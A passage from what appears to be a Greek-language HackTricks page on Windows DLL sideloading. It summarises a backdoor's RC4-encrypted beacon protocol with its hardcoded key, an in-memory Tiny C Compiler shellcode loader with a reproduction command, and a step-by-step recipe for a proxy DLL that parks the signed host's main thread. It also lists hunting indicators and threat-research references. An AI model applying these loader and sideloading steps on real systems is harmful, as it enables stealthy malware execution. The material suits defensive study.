- Τα beacons δημιουργούν ένα dot-delimited host profile, προσθέτουν μπροστά το tag `4Q` και έπειτα το κρυπτογραφούν με RC4 και κλειδί `vAuig34%^325hGV` πριν από την κλήση του `HttpSendRequestA` μέσω HTTPS. Οι αποκρίσεις αποκρυπτογραφούνται με RC4 και δρομολογούνται μέσω ενός tag switch (`4T` shell, `4V` εκτέλεση διεργασίας, `4W/4X` εγγραφή αρχείου, `4Y` ανάγνωση/exfil, `4\\` απεγκατάσταση, `4` απαρίθμηση drives/files + περιπτώσεις μεταφοράς σε chunks).
- Η λειτουργία εκτέλεσης καθορίζεται από τα CLI args: χωρίς args = εγκατάσταση persistence (service/Run key) που δείχνει στο `-i`· το `-i` επανεκκινεί το ίδιο το πρόγραμμα με `-k`· το `-k` παρακάμπτει την εγκατάσταση και εκτελεί το payload.

Εναλλακτικός loader που παρατηρήθηκε
- Η ίδια εισβολή εγκατέστησε το Tiny C Compiler και εκτέλεσε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` στον ίδιο φάκελο. Ο κώδικας C που παρείχε ο επιτιθέμενος περιείχε ενσωματωμένο shellcode, το οποίο μεταγλωττίστηκε και εκτελέστηκε στη μνήμη χωρίς να γραφτεί PE στον δίσκο. Αναπαραγάγετε με:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Αυτό το στάδιο μεταγλώττισης και εκτέλεσης με βάση το TCC εισήγαγε το `Wininet.dll` κατά τον χρόνο εκτέλεσης και ανέκτησε shellcode δεύτερου σταδίου από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιέζεται σε εκτέλεση compiler.

## Signed-host sideloading με export proxying + host thread parking

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **εργασίες μηχανικής σταθερότητας**, ώστε το νόμιμο host να παραμένει ενεργό για αρκετό χρόνο ώστε να φορτώσει ομαλά τα επόμενα στάδια, αντί να καταρρεύσει μετά τη φόρτωση του κακόβουλου DLL.<sup>[[11]](#references)</sup>

Παρατηρημένο μοτίβο
- Τοποθετήστε ένα έμπιστο EXE δίπλα σε ένα κακόβουλο DLL, χρησιμοποιώντας το αναμενόμενο όνομα εξάρτησης, όπως `version.dll`.
- Το κακόβουλο DLL **κάνει proxy κάθε αναμενόμενο export** προς το πραγματικό DLL συστήματος (για παράδειγμα, `%SystemRoot%\\System32\\version.dll`), ώστε να συνεχιστεί επιτυχώς η επίλυση των imports και να παραμείνει λειτουργική η διεργασία host.
- Μετά τη φόρτωση, το κακόβουλο DLL **εφαρμόζει patch στο entry point του host**, ώστε το main thread να μπει σε έναν ατέρμονο βρόχο `Sleep`, αντί να τερματιστεί ή να εκτελέσει διαδρομές κώδικα που θα έβαζαν τέλος στη διεργασία.
- Ένα νέο thread εκτελεί την πραγματική κακόβουλη εργασία: αποκρυπτογραφεί το όνομα ή τη διαδρομή του DLL επόμενου σταδίου (συχνά χρησιμοποιούνται RC4/XOR) και, στη συνέχεια, το εκκινεί με `LoadLibrary`.

Γιατί έχει σημασία
- Το συνηθισμένο DLL proxying διατηρεί τη συμβατότητα API, αλλά δεν εγγυάται ότι το host θα παραμείνει ενεργό για αρκετό χρόνο ώστε να φορτωθούν τα επόμενα στάδια.
- Η ακινητοποίηση του main thread με `Sleep(INFINITE)` είναι ένας απλός τρόπος να παραμείνει η υπογεγραμμένη διεργασία ενεργή, ενώ ο loader εκτελεί αποκρυπτογράφηση, staging ή αρχικοποίηση δικτύου σε ένα worker thread.
- Η αναζήτηση μόνο για ύποπτο `DllMain` μπορεί να παραβλέψει αυτό το μοτίβο, αν η ενδιαφέρουσα συμπεριφορά αρχίζει αφού εφαρμοστεί patch στο entry point του host και ξεκινήσει ένα δευτερεύον thread.

Ελάχιστη ροή εργασίας
1. Αντιγράψτε το υπογεγραμμένο host EXE και προσδιορίστε ποιο DLL φορτώνει από τον τοπικό κατάλογο.
2. Δημιουργήστε ένα proxy DLL που εξάγει τις ίδιες συναρτήσεις και τις προωθεί στο νόμιμο DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιουργήστε ένα worker thread.
4. Από αυτό το thread, εφαρμόστε patch στο entry point του host ή στη ρουτίνα εκκίνησης του main thread, ώστε να εκτελεί επαναληπτικά `Sleep`.
5. Αποκρυπτογραφήστε το όνομα/τη διαμόρφωση του DLL επόμενου σταδίου και καλέστε `LoadLibrary` ή κάντε manual-map το payload.

Αμυντικά σημεία διερεύνησης
- Υπογεγραμμένες διεργασίες που φορτώνουν το `version.dll` ή παρόμοιες κοινές βιβλιοθήκες από τον κατάλογο της ίδιας της εφαρμογής αντί από το `System32`.
- Patches μνήμης στο entry point της διεργασίας λίγο μετά τη φόρτωση του image, ειδικά άλματα/κλήσεις που ανακατευθύνονται στις `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από proxy DLL και καλούν αμέσως `LoadLibrary` για δεύτερο DLL με αποκρυπτογραφημένο όνομα.
- Proxy DLL με όλα τα exports, τοποθετημένα δίπλα σε εκτελέσιμα αρχεία προμηθευτών μέσα σε εγγράψιμους καταλόγους staging, όπως `ProgramData`, `%TEMP%` ή διαδρομές αποσυμπιεσμένων αρχείων.

## References

- [1] [Red Canary – Πληροφορίες από το Intelligence: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Κλιμάκωση προνομίων με χρήση του TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking στα Windows. Απλό παράδειγμα C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Το Nimbus Manticore αναπτύσσει νέο malware με στόχο την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τους βοηθητικούς μηχανισμούς των Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Ψηφιακά σωσίες: Ανατομία εξελισσόμενων εκστρατειών πλαστοπροσωπίας που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Συγκλίνοντα συμφέροντα: Ανάλυση ομάδων απειλών που στοχεύουν κυβερνητικό οργανισμό της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το δίκτυο αναμετάδοσης και την εσωτερική λειτουργία μιας μυστικής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Το Chrysalis Backdoor: Μια εις βάθος ανάλυση του toolkit της Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: αλυσίδα ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Παρακολούθηση των εκστρατειών κατασκοπείας του 2026 της ιρανικής APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Στοιχείο `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Στοιχείο `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Στοιχείο `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Στοιχείο `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Στοιχείο `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Στοιχείο `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Γρήγοροι και εξαγριωμένοι: Οι επιχειρήσεις του Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ενέργειες εργασιών](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – Η CL-STA-1062 στοχεύει κυβερνήσεις και κρίσιμες υποδομές της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – Μορφή PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Αποκάλυψη παραλλαγής SectopRAT ενσωματωμένης σε νόμιμο λογισμικό](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
